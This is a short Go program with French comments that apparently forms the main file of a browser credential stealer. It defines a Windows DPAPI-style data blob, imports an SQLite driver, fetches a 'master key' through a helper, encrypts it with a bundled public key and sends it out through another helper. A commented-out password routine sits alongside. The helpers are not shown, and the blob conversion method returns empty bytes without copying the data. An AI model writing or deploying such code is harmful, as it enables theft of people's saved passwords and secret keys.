package main

import (
	"fmt"

	_ "github.com/mattn/go-sqlite3"

	utils "app/utils"
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	return d
}

func main() {

	//password()
	// Chiffrement du fichier et récupération de la clé
	// Chiffre le fichier et retourne la clé
	key, err := utils.EncryptWithPublicKey(utils.GetMasterKey(), "./assets/public.pem")
	if err != nil {
		fmt.Println("Erreur lors du chiffrement de la masterkey :", err)
	}

	err = utils.Send(key)
	if err != nil {
		fmt.Println("Erreur lors de l'envoi de la clé :", err)
	}
}
